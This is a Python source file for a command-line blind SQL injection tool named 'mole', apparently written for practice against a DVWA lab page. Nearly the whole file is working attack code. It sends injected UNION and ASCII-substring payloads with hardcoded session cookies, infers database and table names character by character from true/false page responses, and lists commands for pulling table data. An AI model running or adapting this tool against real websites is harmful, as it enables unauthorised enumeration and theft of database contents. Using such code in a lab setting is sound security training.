import requests
import subprocess as sp
import time
import sys
from pynput.keyboard import Key, Listener
from threading import Thread
from termcolor import colored

table_list = {}
exit = 0
delay = 10
stop = False
database_list = []
r = requests.Session()
url="http://192.168.1.26:8080/dvwa/vulnerabilities/sqli_blind/"
data = {
    'id': "1",
    'Submit': 'Submit'
    }
cookies = {
    'PHPSESSID': 'm17755srpd9b5jcc8712sivlbr',
    'security': 'low'
    }
pass_phrase = 'User ID exists in the database.'
deny_phrase = 'User ID is MISSING from the database.'

# ----------------------------- Development -----------------------------

def print_promp():

    sp.call('clear', shell=True)

    mole = ("\n"+
    "                                                                                 _.-=-._            \n"+
    "                                                                              o~`  '  > `.          \n"+
    "                                                                              `.  ,       :         \n"+
    "                                                                               `'-.__/    `.        \n"+
    "                                                                                  /       ::        \n"+
    "                                              88                                 / .:    .:|        \n"+
    "                                              88                                :       .::!.       \n"+
    "                                              88                               /'| ::  :::'!!       \n"+
    "               88,dPYba,,adPYba,   ,adPPYba,  88  ,adPPYba,                  .:  :/' .::/  !!       \n"+
    "               88P    \"88\"    '8a a8'     '8a 88 a8P     88                  :::/   :::'   !!     \n"+
    "               88      88      88 8b       d8 88 8PP8888888                  `:'::'''!!    !!       \n"+
    "               88      88      88 '8a,   ,a8' 88 '8b,                          /          :!!.      \n"+
    "               88      88      88  '\"YbbdP\"'  88  '\"Ybbd8\"'                   /     .-~-:  !!!  \n"+
    "                                                                             /:   :'        !!.     \n"+
    "                                                                            :::  :'          !!     \n"+
    "                                                                            |::  |        :!!!!     \n"+
    "                                                                            `::  :        !!!!'     \n"+
    "                                                                             |:. `:    .  '!!!      \n"+
    "                                                                             `::.  \   `::. !'      \n"+
    "                                                                              _.`::.\     ::        \n"+
    "                                                                           .-~_____:~~    :'        \n"+
    "                                                                           ~~~  .-'__..-~'          \n"+
    "                                                                                ~~~                 \n")

    print(mole)

def print_menu():
    menu = ("\n1)  set url {url}                           : Set url for the attack"+
        "\n2)  set cookies {cookie1;cookie2}           : Set cookies"+
        "\n3)  set params {param1;param2}              : Set request parameters"+
        "\n4)  set delay {delay}                       : Set delay between every fetch"+
        "\n5)  get databases                           : Fetch names of databases"+
        "\n6)  show databases                          : List names of databases"+
        "\n7)  get tables from {database}              : Fetch names of tables on selected database"+
        "\n8)  show tables from {database}             : List names of tables on selected database"+
        "\n7)  get data from {database}/{table}        : Fetch data of selected table and databases"+
        "\n8)  show data from {database}/{table}       : List data of selected table and databases"+
        "\n9)  help or ?                               : Display all commands"+
        "\n10) exit                                    : Exit program")

    print(menu)

def print_help():
    help = "\nType 'help' or '?' for help."
    print(help)

def exit_mole():
#    global exit
#    exit = 1
    print("\nBye!\n")
    time.sleep(2)
    sys.exit()

# -----------------------------------------------------------------------

# ----------------------------- Controller -----------------------------

def execute_command(command):

    if command.startswith("show tables from "):

        selected_database = command.split("show tables from ")[1]
        show_tables(selected_database)

    elif command.startswith("get tables from "):

        selected_database = command.split("get tables from ")[1]

        start_listener()
        get_tables(selected_database)
        stop_listener()

    elif command == "show databases":

        show_databases()

    elif command == "get databases":

        start_listener()
        get_databases()
        stop_listener()

    elif command == "help" or command == "?":

        print_menu()

    elif command == "exit":

        exit_mole()

    else:

        print_help()

# ----------------------------------------------------------------------

# ------------------------------ Table ------------------------------

def show_tables(selected_database):
    print("")
    try:
        for i in range(len(table_list[selected_database])):
            print(str(i+1)+") "+table_list[selected_database][i])
    except:
        print("")

def get_table_char(selected_database, table, char):

    char = char + 1

    return_char = "?"
    for ascii in range(128):

        if stop == True:
            return "exit"

        data = {
            'id': "1' and 1=0 union "+
                "select 1, 1 "+
                "from information_schema.tables "+
                "where ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema = '" + selected_database + "' limit "+str(table)+", 1), "+str(char)+", 1)) = "+str(ascii)+"#",
            'Submit': 'Submit'
            }

        response = r.get(url, params=data, cookies=cookies).text

        if pass_phrase in response:
            return_char = chr(ascii)
            break
        elif deny_phrase in response:
            continue
        else:
            return "error"

    return return_char

def get_table_num_char(selected_database, table):

    num_chars = 0
    while True:

        data = {
            'id': "1' and 1=0 union "+
                "select 1, 1 "+
                "from information_schema.tables "+
                "where (select length(table_name) from information_schema.tables WHERE table_schema = '" + selected_database + "' limit "+str(table)+", 1) = "+str(num_chars)+"#",
            'Submit': 'Submit'
            }

        response = r.get(url, params=data, cookies=cookies).text

        if pass_phrase in response:
            break
        elif deny_phrase in response:
            num_chars = num_chars + 1
            continue
        else:
            return "error"

    return num_chars

def get_num_tables(selected_database):

    num_tables = 0
    while True:

        data = {
            'id': "1' and 1=0 union "+
                "select 1, 1 "+
                "from information_schema.tables "+
                "where (select count(table_name) from information_schema.tables WHERE table_schema = '" + selected_database + "') = "+str(num_tables)+"#",
            'Submit': 'Submit'
            }

        response = r.get(url, params=data, cookies=cookies).text

        if pass_phrase in response:
            break
        elif deny_phrase in response:
            num_tables = num_tables + 1
            continue
        else:
            return "error"

    return num_tables

def get_tables(selected_database):

    #status = check_options()

    global table_list
    table_list[selected_database] = []

    if 1==1:
        num_tables = get_num_tables(selected_database)
        print("")
        for table in range(num_tables):
            num_chars = get_table_num_char(selected_database, table)
            index = table + 1
            table_name = ""
            for char in range(num_chars):
                char = get_table_char(selected_database, table, char)
                if char == "exit":
                    return
                table_name = table_name + char
            table_list[selected_database].append(table_name)
            time.sleep(delay)
            print(str(index)+") "+table_name)
    else:
        pass

# -------------------------------------------------------------------

# ----------------------------- Database -----------------------------

def show_databases():
    print("")
    for i in range(len(database_list)):
        print(str(i+1)+") "+database_list[i])

def get_database_char(database, char):

    char = char + 1

    return_char = "?"
    for ascii in range(128):

        if stop == True:
            return "exit"

        data = {
            'id': "1' and 1=0 union "+
                "select 1, 1 "+
                "from information_schema.tables "+
                "where ascii(substring((select schema_name from information_schema.schemata limit "+str(database)+", 1), "+str(char)+", 1)) = "+str(ascii)+"#",
            'Submit': 'Submit'
            }

        response = r.get(url, params=data, cookies=cookies).text

        if pass_phrase in response:
            return_char = chr(ascii)
            break
        elif deny_phrase in response:
            continue
        else:
            return "error"

    return return_char

def get_database_num_char(database):

    num_chars = 0
    while True:

        data = {
            'id': "1' and 1=0 union "+
                "select 1, 1 "+
                "from information_schema.tables "+
                "where (select length(schema_name) from information_schema.schemata limit "+str(database)+", 1) = "+str(num_chars)+"#",
            'Submit': 'Submit'
            }

        response = r.get(url, params=data, cookies=cookies).text

        if pass_phrase in response:
            break
        elif deny_phrase in response:
            num_chars = num_chars + 1
            continue
        else:
            return "error"

    return num_chars

def get_num_databases():

    num_databases = 0
    while True:

        data = {
            'id': "1' and 1=0 union "+
                "select 1, 1 "+
                "from information_schema.tables "+
                "where (select count(schema_name) from information_schema.schemata) = "+str(num_databases)+"#",
            'Submit': 'Submit'
            }

        response = r.get(url, params=data, cookies=cookies).text

        if pass_phrase in response:
            break
        elif deny_phrase in response:
            num_databases = num_databases + 1
            continue
        else:
            return "error"

    return num_databases

def get_databases():

    #status = check_options()

    global database_list
    database_list = []

    if 1==1:
        num_databases = get_num_databases()
        print("")
        for database in range(num_databases):
            num_chars = get_database_num_char(database)
            index = database + 1
            database_name = ""
            for char in range(num_chars):
                char = get_database_char(database, char)
                if char == "exit":
                    return
                database_name = database_name + char
            database_list.append(database_name)
            time.sleep(delay)
            print(str(index)+") "+database_name)
    else:
        pass

# --------------------------------------------------------------------

# ----------------------------- Quit Search -----------------------------

def on_press(key):
    global exit
    if exit == 1:
        exit = 0
        sys.exit()

def on_release(key):
    try:
        if key.char == "q":
            global stop
            stop = True
            time.sleep(5)
            stop = False
    except:
        pass

def key_listener():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def start_listener():
    global t
    t = Thread(target=key_listener)
    t.start()

def stop_listener():
    global exit
    exit = 1

t = 0

# -----------------------------------------------------------------------

# -------------------------------- Main --------------------------------

def main():

    print_promp()

    #Thread(target=key_listener).start()

    while True:
        print(colored("\n mole", "red")+colored("-> ", "yellow"), end="")
        command = input()
        execute_command(command)


if __name__ == "__main__":
    main()

# -----------------------------------------------------------------------
